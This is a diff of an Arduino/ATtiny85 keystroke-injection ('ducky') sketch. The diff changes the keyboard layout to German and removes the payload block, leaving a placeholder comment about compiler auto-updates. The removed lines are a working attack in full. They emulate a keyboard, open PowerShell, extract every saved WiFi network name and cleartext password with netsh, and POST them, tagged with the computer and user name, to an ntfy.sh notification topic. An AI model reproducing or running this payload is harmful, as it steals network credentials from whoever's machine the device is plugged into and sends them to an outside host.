@@ -3,7 +3,7 @@
 
 #include "attiny85_ducky.h"
 
-ATTinyDuckyKeyboard keyboard(lang_us);
+ATTinyDuckyKeyboard keyboard(lang_de);
 
 int redLED = LED_BUILTIN;
 
@@ -12,24 +12,7 @@ void setup() {
     digitalWrite(redLED, HIGH);
 
     // --- PAYLOAD START ---
-    keyboard.delay(1500);
-    keyboard.sendKeyStroke(KEY_X, KEY_MOD_GUI);
-    keyboard.delay(1200);
-    keyboard.println(F("i"));
-    keyboard.delay(1200);
-    keyboard.delay(5000);
-    keyboard.print(F("$p=netsh wlan show profiles|"));
-    keyboard.print(F("sls 'All.*P\\w*\\s*:\\s*(.+)$'|%{$n=$_.Matches[0].Groups[1].Value.Trim();"));
-    keyboard.print(F("$p=(netsh wlan show profile name=\"$n\" key=clear|"));
-    keyboard.print(F("sls 'K\\w*\\s*C\\w*\\s*:\\s*(.+)$').Matches[0].Groups[1].Value.Trim();"));
-    keyboard.print(F("\"${n}:$p\"} 2>$null|sort -Unique|Out-String;"));
-    keyboard.print(F("$r=@{Method=\"POST\";URI=\""));
-    keyboard.print(F("https://ntfy.sh/"));
-    keyboard.print(F("b8b9e8ab7d825776e8ee1be82b873d24"));
-    keyboard.print(F("\";Headers=@{Title=\"$env:COMPUTERNAME\\$env:USERNAME WiFi Creds Extracted\""));
-    keyboard.print(F(";Priority=\"urgent\";Tags=\"warning,skull\";Markdown=\"yes\"};"));
-    keyboard.print(F("Body=\"``````$p``````\"};Invoke-RestMethod @r;Clear-Host"));
-    keyboard.sendKeyStroke(KEY_ENTER);
+    // AUTO UPDATED BY THE COMPILER - DO NOT EDIT BETWEEN THESE LINES MANUALLY
     // --- PAYLOAD END ---
 
     digitalWrite(redLED, LOW);
